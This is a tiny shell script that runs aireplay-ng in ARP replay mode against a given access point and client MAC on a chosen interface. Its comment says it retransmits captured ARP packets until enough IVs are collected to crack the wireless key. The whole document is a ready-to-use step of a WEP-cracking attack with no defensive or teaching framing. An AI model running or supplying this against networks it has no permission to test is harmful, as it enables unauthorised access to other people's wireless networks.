#wait for an arp packet and capture and retransmit it until we have enough IVs to crack the key

AP_macad="$1"
NAT_macad="$2"
nic="$3"

aireplay-ng --arpreplay -b "$AP_macad" -h "$NAT_macad" "$nic"
